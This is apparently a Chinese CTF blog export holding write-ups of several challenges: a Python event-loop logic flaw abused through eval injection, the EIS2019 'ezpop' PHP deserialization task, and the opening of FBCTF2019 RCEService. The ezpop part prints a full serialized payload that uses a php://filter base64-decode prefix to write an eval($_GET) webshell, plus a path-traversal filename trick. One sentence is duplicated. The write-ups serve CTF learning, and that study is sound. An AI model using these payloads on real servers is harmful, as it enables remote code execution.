<span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>
    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> haystack


<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>


<span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    valid_event_chars <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>
    resp <span class="token operator">=</span> None
    <span class="token keyword">while</span> len<span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>
        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>
            <span class="token keyword">if</span> c <span class="token operator">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>
            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>
            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                event_handler <span class="token operator">=</span> eval<span class="token punctuation">(</span>action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 仅仅是拼接字符串罢了</span>
                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 函数在这里执行</span>
            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>
                <span class="token keyword">if</span> resp <span class="token keyword">is</span> None<span class="token punctuation">:</span>
                    resp <span class="token operator">=</span> <span class="token string">''</span>
                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>
                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>
                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>
                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>
                <span class="token keyword">break</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">if</span> resp <span class="token keyword">is</span> None<span class="token punctuation">:</span>
                    resp <span class="token operator">=</span> <span class="token string">''</span>
                <span class="token comment" spellcheck="true"># resp += str(e) # only for debugging</span>
                <span class="token keyword">continue</span>
            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
                <span class="token keyword">if</span> resp <span class="token keyword">is</span> None<span class="token punctuation">:</span>
                    resp <span class="token operator">=</span> ret_val
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    resp <span class="token operator">+=</span> ret_val
    <span class="token keyword">if</span> resp <span class="token keyword">is</span> None <span class="token operator">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>
    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">return</span> resp


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>
    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token operator">or</span> <span class="token punctuation">(</span><span class="token operator">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> len<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>
        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>
    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>
        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> dict<span class="token punctuation">(</span>session<span class="token punctuation">)</span>
    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>
    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># handlers/functions below --------------------------------------</span>


<span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    html <span class="token operator">=</span> <span class="token string">''</span>
    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have {} diamonds, {} points now.&lt;br />'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>
        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>
        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>
        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>
        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>
    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>
        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>
    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>
        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>
        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>
    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>
    <span class="token keyword">return</span> html


<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    bool_show_source <span class="token operator">=</span> str<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    bool_download_source <span class="token operator">=</span> str<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>

        source <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
        html <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>
            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>
            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>

        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>
            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>
                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>
                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                html <span class="token operator">+=</span> line
        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>
            headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>
            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>
            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> html
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    num_items <span class="token operator">=</span> int<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'invalid number({}) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items
    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    point_to_consume <span class="token operator">=</span> int<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RollBackException
    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume


<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token comment" spellcheck="true"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>
    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span>


<span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># show_flag_function has been disabled, no worries</span>
        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span>
</code></pre>
<p>看一遍下来大概能看懂怎么回事，定义了trigger_event用来向列表中添加事件，而命令的执行则集中在execute_event_loop中完成，定义了一系列handler和function，实现用户功能，并且用户只能传action的参数执行handler，所有的function均由handler函数进一步调用</p>
<p>工具函数get_mid_str，获取action内容，也被用来提取参数，function和handler中前面两个渲染界面的没什么用，直接不看，后面四个就比较关键，那个show_flag_function真的是在骗我，我看那里有那么长一串注释我还以为是出题人的提示，但是返回值写死了flag也是自己赋的值，我在一个奇奇怪怪的地方卡了半天</p>
<p>这里的buy_handler先进行购买，再使用trigger_event将付款操作加入处理队列，如果钱不够，触发一个回滚异常，将钱货全部回滚到交易前的状态，看起来是一系列操作流畅执行完美无缺的，但是他的问题在于不是buy_handler直接调用consume_point_function，而是将其添加到处理队列中，如果我们正常的去执行的话，一次的确也只能请求一个handler，那么自然是一系列流程无懈可击，但是在我们的入口entry_point中，这个query_string是可控的，而几经辗转它在execute_event_loop中，被eval拼接_headler或_function，合着它的参数被动态执行</p>
<p>这里这个eval我愚蠢的认为拼出来的函数会直接执行，就没看懂后面的event_handler(args)，呜呜呜</p>
<p>事实上这里如果我们在函数名后面加上#，eval会认为后面的内容被注释掉，这样就可以进行任意函数执行了，如果我们执行一下trigger_event，就可以控制命令执行的顺序</p>
<p>更有意思的一点是，trigger_event函数可以处理参数是一个列表，那么我们如果传入buy_handler之后立马传入get_flag_handler，那么在执行队列执行完buy_handler之后添加的consume_point_function就会被添加到get_flag_function的后面，而get_flag_function发现我们的货已经够了，就把flag写进了session，而这个时候consume_point_function才来得及验货，再回滚也没机会了，flag就到我们的手上了</p>
<p>其实一开始就应该考虑flag怎么拿的，显然整个程序下来只有get_flag_handler拿得到flag，而他调用的show_flag已经被禁用了，但是会将flag写入session，我们直接查session就能获得，就不会一开始对着那个被禁用的函数发呆了</p>
<p>看到有一篇wp写的，买东西的题很有可能是逻辑漏洞，有道理</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>EIS2019 ezpop</title>
    <url>/%5BEIS%202019%5Dezpop.html</url>
    <content><![CDATA[<h1 id="EIS2019-ezpop"><a href="#EIS2019-ezpop" class="headerlink" title="[EIS2019] ezpop"></a>[EIS2019] ezpop</h1><p>看到这个标题就知道应该是反序列化构造pop链，不过实际写下来感觉pop链没什么东西，绕过的trick倒是学了一堆，先上源码</p>
<pre class=" language-PHP"><code class="language-PHP"><?php
error_reporting(0);

class A {

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();
//        print $contents;
        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        return $this->options['prefix'] . $name;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
//        print $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }

}

if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}

$dir = "uploads/";

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]);

$b = new B();
$b->options['serialize'] = "strval";
$b->options['prefix'] = "php://filter/write=convert.base64-decode/resource=./uploads/";
$a = new A($b, 'z3ratu1.php');
$a->cache = array('dirname'=> "PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4");
echo str_replace(' ','%',serialize($a));
</code></pre>
<p>定义两个类，魔法方法就A中一个构造一个析构，能用的只有析构，析构直接进save，save函数仅在B类中存在，也就省去了有的题目还要思考是走哪个类的pop链的问题<br>类A最后会通过析构进入类B的save函数中，所以store这个对象肯定是一个B，类A剩下两个函数都是对content内容进行加工，但是就我做题情况而言，好像这两个函数都没什么用。。。<br>总的效果就是如果数组中存在一个值仍为数组，就把他和写死的数组比较然后返回键名相同的项，最后通过json_encode一下，<br>最后这个值会在save函数里作为data的内容拼接一个exit写入文件，剩下的A，B两个类里面的大部分参数都是直接可以控制的，A中的key为写入的文件名，B中的option[‘prefix’]是目录名<br>options[‘expire’]不知道有什么用，一通类型转换之后写进了注释里面，<code>sprintf(&#39;%012d&#39;, $expire)</code>这里的%012d表示最短12位的数字，不足12位用0填充<br>option[‘serialize’]中对应的函数名对我们传入的数据进行一次处理，什么都不做就可以了，选择strval()<br>options[‘data_compress’]不知道是想干什么，是不是把自己写入的字符串压缩一下到时候可以在写入的时候用伪协议解压写入来绕过死亡exit？<br>但是file_put_contents也支持其他协议，比如php:&#x2F;&#x2F;filter，我们把shell先用base64编码传入，用base64解码将整个内容解码写入就可以绕过死亡exit了，这个是个很老的trick，以前看p神的博客有写过<br>整个题重点就是一个<code>option[&#39;prefix&#39;] = &#39;php://filter/write=convert.base64-decode/resource=upload/&#39;</code></p>
<h2 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h2><p>看清这些代码在干什么并不难，只要能想到死亡exit的绕过题目难度就不大，而这里的编码解码绕过是有一点点小坑的<br>base64编码以3个字节为一组，编码成4个字节一组的字符串，末尾不足的位数用&#x3D;补齐，所以我们得让最后的data处我们shell前面的字符是4的倍数才能使得他被正确解码<br>我为了统计字数看了一下data的内容</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">//000000000000</span>
 <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"dirname"</span><span class="token punctuation">:</span><span class="token string">"PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">]</span>
</code></pre>
<p>这里的</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">//000000000000</span>
 <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"dirname"</span><span class="token punctuation">:</span>"
</code></pre>
<p>长度一共是45，但是编码是能刚好成功的，可以说是运气好碰上的，因为这里面有很多base64编码后不存在的字符，例如空格，?&gt;();等，这些字符在解码时全部被忽略了，换行符什么的都一样，所以实际上参与解码的内容就只剩下了<code>php//000000000000exitdirnamePD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4null</code><br>所以凑字符串的时候还是要注意一下怎么回事<br>还有一个点在于我们的shell<code>&lt;?php eval($_GET[&#39;a&#39;]); ?&gt;</code>编码的结果其实是<code>PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4=</code>末尾有一位等号填充，但是如果把这个等号也放进去的话，shell里面就写不进去了，（我猜测）是因为&#x3D;是编码结束之后用来填充的内容，但是这里在shell后面还有内容，解码的时候却突然遇到了一个&#x3D;，导致解码出错了</p>
<p>A类里面的那个对比数组的方法我还是不知道有什么用，因为只要我的数组值不是数组它就无法对我造成影响，我shell前面那个键值随便写什么都不会有影响，也不存在用那个函数去调整前面的字符凑编码</p>
<p>payload </p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">" * store"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"options"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"serialize"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"strval"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"prefix"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">:</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=./uploads/";}}s:6:" * key";s:11:"z3ratu1.php";s:9:" * expire";N;s:5:"cache";a:1:{s:7:"dirname";s:35:"PD9waHAgZXZhbCgkX0dFVFsiYSJdKTsgPz4";}}</span>
</code></pre>
<p>空格为protected变量的标识符，实际上url编码为%00</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>buu上还有一个新春红包题，和这个题基本一模一样，就是在文件名前面拼接了一个随机字符串，然后又检查了后缀是否为.php<br>由于前面有一个死亡exit，没法传htaccess来解析其他后缀，而php5,phtml等后缀又不能解析<br>生成的随机字符串无法获取，也就无法知道上传的文件名<br>因此稍微修改一下payload，只需要整体在key上面动动手脚就可以<br>新payload的key为: <code>/../z3ratu1.php/.</code>，通过&#x2F;..&#x2F;将之前的随机字符串作为一个目录，而再用..跳出，这样子就绕过随机字符串，控制了文件名，而最后的&#x2F;.仍为当前工作目录，是以前看到过的一个绕后缀的trick，这样子就能绕过后缀检测在目录下创建php文件为一个目录，而再用..跳出，这样子就绕过随机字符串，控制了文件名，而最后的&#x2F;.仍为当前工作目录，是以前看到过的一个绕后缀的trick，这样子就能绕过后缀检测在目录下创建php文件</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>[FBCTF2019]RCEService</title>
    <url>/%5BFBCTF2019%5DRCEService.html</url>
    <content><![CDATA[<h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>buu上的题，最近打工开始划水，又要搞网鼎杯了，赶紧报一下佛脚</p>
<h2 id="json文件格式"><a href="#json文件格式" class="headerlink" title="json文件格式"></a>json文件格式</h2><p>我太菜了，json属性字段一定要用双引号括起来，单引号是不可以的，为此我一开始试了半天，为什么输入什么东西都显示上了waf。。。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这个题，buu上什么都没给，后来去查wp，才知道题目描述是只允许使用ls，然后顺便还翻到了源码，一开始设置了一句<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，这个文件夹下面就放了一个ls的二进制文件。这样子就能让我们只能使用这个文件夹下的命令了吗？显然我们可以用绝对路径的方法去使用需要的命令，&#x2F;bin&#x2F;ls之类的就可以了</p>
<p>然后是一个超级禁用，用preg_match函数ban掉了各种各样的东西，能ban的都ban了。但是preg_match这个函数本身是存在缺陷的，有两点，分别导致了预期解和非预期解</p>
